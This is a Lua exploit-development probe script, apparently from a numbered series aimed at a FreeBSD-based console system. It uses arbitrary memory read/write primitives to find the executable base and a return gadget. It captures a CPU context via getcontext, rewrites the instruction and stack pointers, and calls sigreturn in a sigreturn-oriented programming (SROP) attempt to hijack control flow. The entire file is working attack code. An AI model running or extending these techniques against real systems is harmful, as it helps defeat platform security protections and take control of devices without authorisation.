-- CRASH_CLASS: HIGH
-- PROBE 128a: SROP via getcontext(421) + sigreturn(417)
--
-- Context: 106a's sigreturn returned -1. Hypothesis: the ucontext was
-- missing fields the kernel validates (trapno, mc_flags, etc).
-- Fix: use getcontext(421) to capture a REAL valid context from the
-- kernel, then modify only RIP, and sigreturn the modified context.
-- The kernel should accept it because all validation fields are genuine.
--
-- Sections:
--   A: getcontext(421) to capture valid context + hex dump
--   B: Modify RIP to eboot ret gadget, sigreturn → should return to gadget
--   C: Modify RIP to make_syscall(getpid) via gadget chain

print("=== PROBE 128a: GETCONTEXT + SROP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot=" .. hex(eboot_base))

-- Find ret gadget
local ret_gadget = eboot_base + 0x42  -- known 0xC3
print("[0] ret_gadget=" .. hex(ret_gadget))

--------------------------------------------------------------------
-- SECTION A: getcontext(421) to capture valid context
--------------------------------------------------------------------
print("")
print("--- SECTION A: getcontext(421) ---")

local CTX_SIZE = 0x500
local ctx = memory.alloc(CTX_SIZE)
zero(ctx, CTX_SIZE)

-- getcontext(ucontext_t *)
local ok_gc, rv_gc = pcall(function()
    return sc_getcontext(uint64(ctx))
end)
print("[A] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. hex(rv_gc))

if ok_gc and to_num(rv_gc) == 0 then
    print("[A] *** GETCONTEXT WORKS! ***")

    -- Dump key fields from the context
    -- Standard FreeBSD amd64 offsets (from 80a confirmation):
    -- MC_RIP=+0x90, MC_CS=+0x98, MC_RFLAGS=+0xA0, MC_RSP=+0xA8, MC_SS=+0xB0
    -- MC_LEN=+0x118
    -- Also: mc_onstack=+0x00, uc_sigmask=+0x04, mc_rdi=+0x58, mc_rsi=+0x60
    -- mc_rdx=+0x68, mc_rbx=+0x70, mc_rcx=+0x78, mc_rax=+0x80, mc_trapno=+0x88

    print("[A] context dump:")
    local fields = {
        {0x00, "uc_onstack"},
        {0x18, "mc_rdi"},
        {0x58, "mc_rdi (alt)"},
        {0x60, "mc_rsi (alt)"},
        {0x68, "mc_rdx (alt)"},
        {0x70, "mc_rbx (alt)"},
        {0x78, "mc_rcx (alt)"},
        {0x80, "mc_rax (alt)"},
        {0x88, "mc_trapno"},
        {0x90, "mc_rip"},
        {0x98, "mc_cs"},
        {0xA0, "mc_rflags"},
        {0xA8, "mc_rsp"},
        {0xB0, "mc_ss"},
        {0xB8, "mc_ds?"},
        {0xC0, "mc_es?"},
        {0xC8, "mc_fs?"},
        {0xD0, "mc_gs?"},
        {0x108, "mc_flags"},
        {0x110, "mc_pad?"},
        {0x118, "mc_len"},
    }
    for _, f in ipairs(fields) do
        local v = rq(ctx + f[1])
        if v then
            local h, l = get_hi_lo(v)
            if h ~= 0 or l ~= 0 then
                print(string.format("  +0x%03X %-15s: %s", f[1], f[2], hex(v)))
            end
        end
    end

    -- Full hex dump of non-zero qwords
    print("[A] full non-zero qwords:")
    for off = 0, CTX_SIZE - 8, 8 do
        local v = rq(ctx + off)
        if v then
            local h, l = get_hi_lo(v)
            if h ~= 0 or l ~= 0 then
                print(string.format("  +0x%03X: %s", off, hex(v)))
            end
        end
    end

    print("")
    print("[A] canary=" .. to_num(sc20()))

    ----------------------------------------------------------------
    -- SECTION B: Modify RIP only, sigreturn
    ----------------------------------------------------------------
    print("")
    print("--- SECTION B: Modify RIP + sigreturn ---")

    -- Save the original context for comparison
    local orig_rip = rq(ctx + 0x90)
    local orig_rsp = rq(ctx + 0xA8)
    print("[B] original RIP=" .. hex(orig_rip) .. " RSP=" .. hex(orig_rsp))

    -- Allocate a separate GPU mmap page for the SROP stack
    local ok_stk, srop_stack = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    print("[B] srop_stack=" .. hex(srop_stack))

    if ok_stk then
        -- Write a marker at the stack location
        local srop_top = srop_stack + 0x3E00
        wq(srop_top, uint64(0xAAAAAAAABBBBBBBB))

        -- Make a COPY of the context and modify only RIP and RSP
        local ctx2 = memory.alloc(CTX_SIZE)
        -- Copy the valid context
        for off = 0, CTX_SIZE - 4, 4 do
            local v = rd(ctx + off)
            wd(ctx2 + off, v or 0)
        end

        -- Set RIP to ret gadget
        wq(ctx2 + 0x90, ret_gadget)
        -- Set RSP to our GPU stack (ret will pop from here)
        wq(ctx2 + 0xA8, srop_top)
        -- Write 0 at [srop_top] so ret → RIP=0 → fault
        -- Actually write a canary so we can tell if we went through
        wq(srop_top, uint64(0))

        print("[B] modified: RIP=" .. hex(rq(ctx2 + 0x90))
            .. " RSP=" .. hex(rq(ctx2 + 0xA8)))

        -- Place a post-sigreturn marker
        print("[BEFORE_SROP]")
        local ok_sr, rv_sr = pcall(function()
            return sc_sigreturn(uint64(ctx2))
        end)
        print("[AFTER_SROP]")
        print("[B] sigreturn: ok=" .. tostring(ok_sr) .. " rv=" .. hex(rv_sr))

        -- If we're still here, sigreturn either:
        -- 1. Returned -1 (failed validation)
        -- 2. Took over but RIP=ret_gadget popped 0 → faulted → returned here somehow
        local post_pid = to_num(sc20())
        print("[B] post-srop canary=" .. post_pid)

        -- Check if the stack was modified (signal of execution)
        local stk_val = rq(srop_top)
        print("[B] srop_stack[0]=" .. hex(stk_val))
    end
else
    print("[A] getcontext FAILED — trying syscall 78...")
    local sc_gc78 = make_syscall(78)
    local ok_gc2, rv_gc2 = pcall(function()
        return sc_gc78(uint64(ctx))
    end)
    print("[A] getcontext(78): ok=" .. tostring(ok_gc2) .. " rv=" .. hex(rv_gc2))

    -- Dump non-zero
    for off = 0, CTX_SIZE - 8, 8 do
        local v = rq(ctx + off)
        if v then
            local h, l = get_hi_lo(v)
            if h ~= 0 or l ~= 0 then
                print(string.format("  +0x%03X: %s", off, hex(v)))
            end
        end
    end
end

print("")
print("[FINAL] canary=" .. to_num(sc20()))
print("=== PROBE 128a COMPLETE ===")
